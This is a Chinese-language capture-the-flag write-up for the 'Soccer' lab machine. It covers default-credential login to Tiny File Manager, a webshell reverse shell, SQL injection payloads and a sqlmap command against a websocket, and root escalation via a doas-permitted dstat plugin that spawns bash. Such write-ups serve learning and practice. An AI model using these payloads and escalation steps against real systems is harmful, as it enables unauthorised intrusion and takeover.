---
title: Soccer
description: 
tags:
  - Tiny File Manager
  - nginx
  - sqlmap
  - doas
  - dstat
date: 2026-04-23
---

## Tiny File Manager

一開始還算簡單，正常的掃 port、dir，很順利的就摸到 Tiny File Manager 的登入畫面，上網查一下預設帳號密碼可以直接登入，可以上傳 WebShell 做 reverse 也是沒有什麼問題，後面才是這題有趣的地方。

## nginx

首先，www-data 權限被鎖的蠻死的，不得已只好先翻看看這台機器上有跑甚麼服務：

```bash
ss -tlunp           # 發現 port 3000 有個服務在跑
ps -aux             # 看不到自己以外的程序
mount | grep ^proc  # 發現 /proc 被設定 hidepid=2
```

於是去翻 nginx 的設定：

- 目錄 `/etc/nginx/sites-enabled`

發現 port 3000 在 `soc-player.soccer.htb` 上運行。先去 /etc/hosts 改一下設定，馬上去 soc-player.soccer.htb 上看看。結果意外發現原本掃描到的 9091 port 是一個 websocket，更有趣的是這東西可以 SQL Injection。

### 測試

```bash
0 or 1=1--
0 union select 1--
0 union select 1, 2--
0 union select 1, 2, 3--
0 union select user, 2, 3 from mysql.user where user like 'r%'--
```

手動測試看起來沒甚麼問題，接下來就是 sqlmap 登場的時候了!（如果沒辦法使用，可能要先 `pip install websocket-client`）

```bash
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3
```

接著終於拿到 player 的密碼了！

## doas

因為 sudo -l 不能用，所以我們改用 `find / -perm -4000 2>/dev/null` 來找有 sudo 權限的檔案，這時翻到了 /usr/local/bin/doas。

這東西就特別了，doas 是從 OpenBSD 移植過來的工具，可以當作 sudo 的替代品。我們首先需要找到 doas.conf，來確認他可以使用的範圍：

```bash
find / -name doas.conf 2>/dev/null
cat /usr/local/etc/doas.conf
```

發現在 /usr/local/etc/doas.conf，裡面則告訴我們，我們可以無密碼的以 root 使用 /usr/bin/dstat

## dstat

dstat 其實是一個系統資源監控工具，而他可以允許使用者自訂 plugin。這個 plugin 必須命名為 dstat_<name>.py，而執行時，則必須要要帶上 dstat --<name>。同時，dstat 會依序檢查以下幾個目錄是否放有 plugin：

```
~/.dstat/
/usr/share/dstat/
/usr/local/share/dstat/
```

~/.dstat/ 在執行時會跑到 root 的家目錄；/usr/share/dstat/ 我們也沒有權限修改，所以我們只能在 /usr/local/share/dstat/ 中新增檔案了：

```bash
echo 'import os\nos.system("bin/bash")' > /usr/local/share/dstat/dstat_sh.py
doas /usr/bin/dstat --sh
```

恭喜你，終於拿到 root 了！
